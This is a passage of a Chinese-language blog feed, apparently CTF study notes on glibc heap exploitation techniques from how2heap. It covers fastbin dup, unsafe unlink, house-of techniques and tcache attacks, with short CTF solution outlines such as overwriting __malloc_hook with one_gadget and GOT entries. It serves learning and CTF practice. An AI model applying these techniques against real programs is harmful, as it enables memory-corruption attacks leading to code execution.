= (CHUNKSIZE - 0x11) / 0x10</code></p><a id="more"></a><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>free(fastbin)过程中，只检查了链表头部是否和将要free的指针一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时fastbin 0x20: <code>a-&gt;b-&gt;a</code></p><p><strong>附注：</strong></p><p>tcache可以检测到double free。在本机glibc2.31中发现，tcache_entry中使用key指向了tcache_perthread_struct。<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f7cd29bc2f93e1082ee77800bd64a4b2a2897055;hb=9ea3686266dca3f004ba874745a4087a89682617#l4186">malloc.c:4186</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>tcache检测double free代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastbin-dup-into-stack-c"><a href="#fastbin-dup-into-stack-c" class="headerlink" title="fastbin_dup_into_stack.c"></a>fastbin_dup_into_stack.c</h2><p>假设fastbin中通过double free得到以下序列。</p><p>fastbin: <code>a-&gt;b-&gt;a</code></p><p>第一次malloc得到a后，修改数据，使得第二个a-&gt;fd指向栈地址。</p><h3 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017-babyheap"></a>0ctf2017-babyheap</h3><p>fill函数中存在对chunk的任意长度溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># smallbin</span></span><br></pre></td></tr></table></figure><p>mmap分配空间那块没看懂，怎么就获得了随机空间。。如果有人看懂，麻烦告诉我一下</p><p><strong>泄露</strong>：通过<strong>partial overwrite</strong>修改fd，指向smallbin。溢出修改smallbin-&gt;size为0x31，两次分配后得到另一指针指向该smallbin。而后重新修改smallbin-&gt;size为0x91，free该smallbin，smallbin-&gt;fd和smallbin-&gt;bk就会指向main_arena中的区域。使用另一指针打印内容就可以得到libc_base。</p><p><strong>攻击</strong>：0x70 fastbin attack，复写<code>__malloc_hook</code>为one_gadget地址。</p><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>double free fastbin到unsorted bin和fastbin。通过分配large bin触发malloc_consolidate，清空fastbin到unsorted bin。<a href="https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png">图源</a></p><p><img src="https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png"></p><h3 id="Hitcon-2016-SleepyHolder"><a href="#Hitcon-2016-SleepyHolder" class="headerlink" title="Hitcon 2016 SleepyHolder"></a>Hitcon 2016 SleepyHolder</h3><p>fastbin dup consolidate double free</p><p>unsafe unlink</p><h3 id="ref-1"><a href="#ref-1" class="headerlink" title="ref"></a>ref</h3><p><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder">https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder</a></p><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>在前块中构造fake_chunk，用一些方法将后块的pre_in_use位清掉，释放后块向前合并。</p><p>伪造fake_chunk需要绕过检查，一般用某个指针变量前后的地址当做fd、bk。之后就会将该指针变量就会被覆盖。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>how2heap对glibc的版本要求<code>&lt;2.26</code>似乎有误？据我测试，<strong>glibc2.31 without tcache也可以运行成功</strong>，只要添加<code>chunk0_ptr[1] = (uint64_t)malloc_size;</code>，glibc2.31中看起来只是增加了size的验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>非fastbin size才会进行前后consolidate。</strong></p><h3 id="Hitcon2014-stkof"><a href="#Hitcon2014-stkof" class="headerlink" title="Hitcon2014 stkof"></a>Hitcon2014 stkof</h3><p>p1分配0x80，p2分配0x80。</p><p>p1内伪造fake_chunk，溢出修改p2的pre_size,pre_in_use。free(p2)</p><p>覆盖free_got泄露地址，再任意写到atoi_got</p><h2 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h2><p>在不可控区域周围构造fakechunk，覆盖某指针，释放再分配，以控制不可控区域。</p><h3 id="hack-lu2014-oreo"><a href="#hack-lu2014-oreo" class="headerlink" title="hack.lu2014 oreo"></a>hack.lu2014 oreo</h3><p>在message_ptr周围构造。</p><h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h2><p>溢出，覆盖已经释放的chunk的size，使其大小变小。free后块使其合并。</p><h3 id="Plaidctf2015-plaiddb"><a href="#Plaidctf2015-plaiddb" class="headerlink" title="Plaidctf2015 plaiddb"></a>Plaidctf2015 plaiddb</h3><p>null byte溢出，堆块重叠，libc泄露和fastbin attack</p><h3 id="ref-2"><a href="#ref-2" class="headerlink" title="ref"></a>ref</h3><ol><li><a href="https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a></li></ol><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><p><strong>glibc2.31 without tcache可以运行成功。</strong></p><p>smallbin链表的特点是头插尾取的FIFO。</p><p>关键的漏洞点在，攻击者可以控制已经释放的smallbin的bk指针。取出smallbin过程中，双向链表尾部被修改为fake_chunk。</p><p>程序中的描述对于64位有些问题，但没有影响效果。64位过程如下：</p><p><code>free((void*)victim)</code>后，该chunk被放入fastbin，后<code>void *p2 = malloc(1200);</code>申请largebin触发malloc_consolidate，将fastbin放入unsortedbin，然后遍历unsortedbin查找chunk导致victim chunk被放入smallbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim_chunk-&gt;bk   = stack_buffer_1;</span><br><span class="line">stack_buffer_1-&gt;fd = vimtim_chunk;</span><br><span class="line">stack_buffer_1-&gt;bk = stack_buffer_2;</span><br><span class="line">stack_buffer_2-&gt;fd = stack_buffer_1;</span><br></pre></td></tr></table></figure><h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h2><p>溢出，对unsortedbin中的chunk的size进行更改，造成重叠。可以添加<code>prev_size(nextchunk) == chunk-&gt;size</code>检查修补。</p><h3 id="hack-lu2015-bookstore"><a href="#hack-lu2015-bookstore" class="headerlink" title="hack.lu2015 bookstore"></a>hack.lu2015 bookstore</h3><p>overlapping</p><p>format string vulnerability：泄露libc，修改fini_array和返回地址</p><h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping chunks 2"></a>overlapping chunks 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>首先free(p4)，溢出，对使用中的chunk p2的size进行更改，free掉p2，与p4合并，造成重叠。</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>覆盖topchun-size为0xffffffff，分配一个能够溢出size_t的evil_size，到目的地址，再分配一次，对其进行修改。</p><h3 id="bctf2016-bcloud"><a href="#bctf2016-bcloud" class="headerlink" title="bctf2016 bcloud"></a>bctf2016 bcloud</h3><p>null byte overflow，strcpy溢出。修改free_got为put_plt，泄露libc base，后修改atoi_got。</p><h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h2><p>和house of lore差不多，只不过这里是对于unsorted bin。</p><p>在栈上伪造chunk，修改unsorted bin尾部chunk的size和bk，使其size不符合下一次分配的要求，使其bk指向栈上伪造的chunk，造成下一次分配落到栈上。</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>修改unsorted bin中某一chunk的bk指向某位置p，接下来该chunk分配后，<code>p+2*SIZE_ZE</code>处会被覆盖为unsorted bin头结点的地址，也就是unsortedbin地址。</p><p>该攻击通常为进一步攻击做准备，比如覆盖global_max_fast</p><h3 id="0ctf2016-zerostorage"><a href="#0ctf2016-zerostorage" class="headerlink" title="0ctf2016 zerostorage"></a>0ctf2016 zerostorage</h3><p>UAF，realloc with topchunk</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&gt;fd、bk_nextsize-&gt;fd_nextsize的位置覆盖成堆的地址。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png" alt="large bin"></p><h3 id="0ctf2018-heapstorm2"><a href="#0ctf2018-heapstorm2" class="headerlink" title="0ctf2018 heapstorm2"></a>0ctf2018 heapstorm2</h3><p>poison null byte, large  bin attack，fake unsorted bin</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>泄露堆地址，计算fake size。</p><p>off-by-one覆盖victim-&gt;pre_in_use，修改victim-&gt;prev_size。</p><p>释放victim，与fake chunk合并。</p><p><strong>victim需要与top chunk临近。</strong></p><h3 id="Secon2016-tinypad"><a href="#Secon2016-tinypad" class="headerlink" title="Secon2016 tinypad"></a>Secon2016 tinypad</h3><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>将<code>topchunk-&gt;size</code>缩小并对齐页，malloc一个大于size，就会将old top chunk释放到unsorted bin中。</p><h3 id="Hitcon2016-houseoforange"><a href="#Hitcon2016-houseoforange" class="headerlink" title="Hitcon2016 houseoforange"></a>Hitcon2016 houseoforange</h3><h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><p>最主要的思想就是partial overwrite，所以能够在不泄露地址的情况下getshell。</p><p>需要溢出或者UAF</p><p>fast bin attack，partial overwrite fd或者bk指向main_arena的块（从small large unsorted bin中malloc），使其指向<code>malloc_hook-0x23</code></p><p>unsorted bin attack，将bk指向malloc_hook-0x10，使得malloc_hook被写入main_arena地址，从而partial overwrite成为system、onegadget等。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>glibc 2.26~2.28</p><p>没有任何检查，简单的double free</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>修改tcache中已释放块的next(fd)到任意位置，然后进行分配得到</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>伪造堆块释放到tcahe。和普通house of spirit不同的是，tcache并没有对后块检查</p><p>prev_inuse没有影响，IS_MMAPPED、NON_MAIN_ARENA有影响</p><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>double free</p><p><a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d">commit</a>在<code>struct tcache_entry</code>结构中添加了key变量指向tcache_perthread_struct，所以简单的向tcache中double free两次会被检测到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">+  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">+  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>使用把某个大小tcache填满的方式，将victim同时double free到tcache和unsorted bin，并在victim前面准备了了prev块，以使得size不一样，便于分配。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用<code>_int_malloc</code>不会使用tcache进行分配（除了遍历unsorted bin的尾部），只会往tcache中填充。</p><p>可以造成target-&gt;bk-&gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。</p><p>有点像fastbin reverse into tcache。</p><h3 id="variation"><a href="#variation" class="headerlink" title="variation"></a>variation</h3><p>在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）</p><p>修改倒数第二个small chunk的bk，calloc触发，只修改bk-&gt;fd。</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>可以使用分割unsorted bin的方法，得到对应大小small bin，在不必填满tcache的情况下。</p><h3 id="Hitcon2019-one-punch"><a href="#Hitcon2019-one-punch" class="headerlink" title="Hitcon2019 one punch"></a>Hitcon2019 one punch</h3><h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h2><p>UAF or overflow</p><p>可以达成类似unsorted bin attack的效果，写入一个大的数字到指定地址。（但也可以获得指定地址的chunk。。</p><p>chunk size = 0x50</p><ol><li><p>填满tcache。除了victim外，再往fastbin释放1或6个chunk。如果要写入位置存储的数值为0，则1个就可以。如果数值不为0，则需要6个。结构如下</p><p>fast bin 0x50: p1-&gt;p2-&gt;p3-&gt;p4-&gt;p5-&gt;p6-&gt;victim</p></li><li><p>分配清空tcache</p></li><li><p>修改victim-&gt;fd为”指定地址-0x10”</p><p>fast bin 0x50: p1-&gt;p2-&gt;p3-&gt;p4-&gt;p5-&gt;p6-&gt;victim-&gt;target</p></li><li><p>malloc触发，target-&gt;fd被覆盖为堆地址。tcache中的结构如下</p><p>tcache 0x50: target-&gt;victim-&gt;p6-&gt;p5-&gt;p4-&gt;p3-&gt;p2</p></li><li><p>再malloc一次，获得target</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;first-fit&quot;&gt;&lt;a href=&quot;#first-fit&quot; class=&quot;headerlink&quot; title=&quot;first-fit&quot;&gt;&lt;/a&gt;first-fit&lt;/h2&gt;&lt;p&gt;如果一个chunk可用且足够大，那么就会使用这个chunk。&lt;/p&gt;
&lt;h2 id=&quot;calc-tcache-idx&quot;&gt;&lt;a href=&quot;#calc-tcache-idx&quot; class=&quot;headerlink&quot; title=&quot;calc_tcache_idx&quot;&gt;&lt;/a&gt;calc_tcache_idx&lt;/h2&gt;&lt;p&gt;tcache(thread local caching)&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; TCACHE_MAX_BINS		64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* Only used to pre-fill the tunables.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* When &amp;quot;x&amp;quot; is from chunksize().  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* When &amp;quot;x&amp;quot; is a user-provided size.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# &lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; usize2tidx(x) csize2tidx (request2size (x))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* With rounding and alignment, the bins are...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 1   bytes 25..40 or 13..20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   idx 2   bytes 41..56 or 21..28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;   etc.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;tcache拥有和fastbin差不多的结构。默认情况下，64个bin，每个bin最多7个chunk&lt;/p&gt;
&lt;p&gt;64bit: &lt;code&gt;IDX = (CHUNKSIZE - 0x11) / 0x10&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--tcache_stashing_unlink_attack Hitcon2019--one_punch</title>
    <link href="http://hhdx.xyz/2020/07/31/How2heap-tcache-stashing-unlink-attack-Hitcon2019-one-punch/"/>
    <id>http://hhdx.xyz/2020/07/31/How2heap-tcache-stashing-unlink-attack-Hitcon2019-one-punch/</id>
    <published>2020-07-31T13:40:45.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用<code>_int_malloc</code>不会使用tcache进行分配（除了<code>_int_malloc</code>遍历unsorted bin的尾部），只会往tcache中填充。</p><p>可以造成target-&gt;bk-&gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。</p><p>有点像fastbin reverse into tcache。</p><h3 id="variation"><a href="#variation" class="headerlink" title="variation"></a>variation</h3><p>在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）</p><p>修改倒数第二个small chunk的bk，calloc触发，只在bk-&gt;fd写入大数字。</p><a id="more"></a><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>可以使用分割unsorted bin的方法，得到对应大小small bin，不必事先填满tcache。</p><h2 id="Hitcon2019-one-punch"><a href="#Hitcon2019-one-punch" class="headerlink" title="Hitcon2019 one_punch"></a>Hitcon2019 one_punch</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>main开始处使用全局变量存储了heap_base+0x10的指针。这里实际上指向了tcache的管理结构<code>tcache_perthread_struct</code>，每个arena存在这么一个。在<code>tcache_init</code>函数中使用<code>_int_malloc</code>分配，在2.29中大小为0x280。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">############################</span><br><span class="line">👼     One Punch Man      👼</span><br><span class="line">############################</span><br><span class="line">#   1. debut               #</span><br><span class="line">#   2. rename              #</span><br><span class="line">#   3. show                #</span><br><span class="line">#   4. retire              #</span><br><span class="line">#   5. Exit                #</span><br><span class="line">############################</span><br></pre></td></tr></table></figure><p>debut：读取字符串到栈上，使用calloc分配对应大小的chunk进行存储且存储长度。输入字符串长度必须在0x80到0x400之间</p><p>rename：更改字符串</p><p>show：打印字符串</p><p>retire 